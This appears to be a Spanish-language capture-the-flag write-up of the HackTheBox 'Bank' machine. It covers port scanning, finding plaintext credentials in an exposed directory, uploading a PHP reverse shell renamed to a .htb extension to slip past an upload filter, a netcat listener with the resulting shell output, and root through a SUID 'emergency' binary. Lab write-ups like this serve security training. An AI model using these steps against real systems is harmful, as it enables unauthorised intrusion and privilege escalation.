---
layout      : post
title       : "Bank - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Bank-HackTheBox/Bank.webp
category    : [ htb ]
tags        : [ Linux ]
---

💲En esta ocasión explotaremos una máquina Easy de HackTheBox muy pero muy sencilla, tendremos que obtener unas credenciales de acceso al servidor web y después subir una reverse shell para poder conseguir acceso al sistema. La escalada de privilegios es un auténtico regalito🎁💲!!

![](/assets/images/HTB/Bank-HackTheBox/rating-bank.png)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)

...


**Un pequeño INDICE**

1. [Reconocimiento](#reconocimiento).
    * [Reconocimiento de Puertos](#recon-nmap).
2. [Enumeración](#enumeración).
    * [Enumeración Web](#enum-web).
3. [Explotación](#explotacion).   
    * [Reverse Shell](#rev-shell).     
4. [Escalada de Privilegios](#privesc). 
    * [Emergency](#emergency).   


...

# Reconocimiento [#](reconocimiento) {#reconocimiento}

----

## Reconocimiento de Puertos [📌](#recon-nmap) {#recon-nmap}

```nmap
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
53/tcp open  domain  syn-ack
80/tcp open  http    syn-ack
```

Escaneamos servicios y las versiones de los mismos.

```nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-title: HTB Bank - Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Aquí tenemos un servidor web en el puerto 80 (http), el puerto 53 (DNS) y el puerto 22 (ssh).

Añadimos al archivo host la ip y el dominio bank.htb

Procedo a enumerar el servidor web

# Enumeración [#](enumeración) {#enumeración}

----

## Enumeración Web [📌](#enum-web) {#enum-web}

Encontramos un login para acceder pero no tenemos credenciales, asique me pongo a enumerar rutas en el servidor para ver que tenemos.

![](/assets/images/HTB/Bank-HackTheBox/web1.png)

Para enumerar las rutas uso gobuster

![](/assets/images/HTB/Bank-HackTheBox/gobuster.png)

Encuentro la ruta balance-transfer y dentro de ella una lista bastante grande con archivos.

![](/assets/images/HTB/Bank-HackTheBox/web2.png)

Abro uno de ellos aleatoriamente

![](/assets/images/HTB/Bank-HackTheBox/data1.png)

Parece que la data está encriptada, pero tras probar y probar y no consigo desencriptarla.

Sigo buscando en la lista de archivos y me fijo en el tamaño de cada uno, suelen rondar entre los 582 y 585 el tamaño de los archivos, asique buscando encuentro uno de ellos que tiene de tamaño 257.

![](/assets/images/HTB/Bank-HackTheBox/web3.png)

Al abrirlo encuentro unas credenciales en texto plano.

![](/assets/images/HTB/Bank-HackTheBox/data2.png)

Usaré las credenciales para iniciar sesión en el panel web.

Una vez dentro encontramos un panel con todas las transacciones y datos bancarios.

![](/assets/images/HTB/Bank-HackTheBox/web4.png)

# Explotación [#](explotacion) {#explotacion}

----

## Reverse Shell [🔥](#rev-shell) {#rev-shell}

Navegando por la web me dirijo a Support y encuentro una formulario donde puedo subir un archivo.

![](/assets/images/HTB/Bank-HackTheBox/web5.png)

Tras ver eso creo un archivo con una reverse shell en php de la siguiente fuente:

[https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Edito la ip y el puerto.

Una vez lista la reverse shell la subo al servidor.

![](/assets/images/HTB/Bank-HackTheBox/errorweb.png)

Pero me arroja ese error, solo se pueden subir imágenes al servidor.

Tras probar a editar el content-type en Burpsuite para bypassear la restricción no tengo éxito asique procedo a analizar el código del support.php donde encuentro el siguiente comentario:

> "[DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]" 

Si cambiamos la extensión de .php a .htb podemos ejecutar los archivos php.

Subimos el archivo y listo:

![](/assets/images/HTB/Bank-HackTheBox/web6.png)

Ahora nos abrimos un listener netcat en el puerto configurado en la rev shell

`nc -lnvp 1234`

Ejecutamos el archivo desde el panel web y tenemos la conexión inversa.

```shell
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.29] 48610
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 00:27:22 up  1:08,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

Una vez dentro ya podemos leer el user.txt

Ahora toca escalar privilegios


# Escalada de Privilegios [#](privesc) {#privesc}

----

## Emergency [🚑](emergency) {#emergency}

Busco binarios SUID de propietarios root con el comando find 

```bash
www-data@bank:/home/chris$ find / -type f -user root -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```
Tenemos el binario emergency

Asique pruebo a ejecutarlo para ver que sucede o que he de hacer...

```bash
www-data@bank:/home/chris$ /var/htb/bin/emergency
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# whoami 
root
```

Lo ejecuto y para mi sorpresa ya soy root!!!

![](/assets/images/HTB/Bank-HackTheBox/dollar.gif)
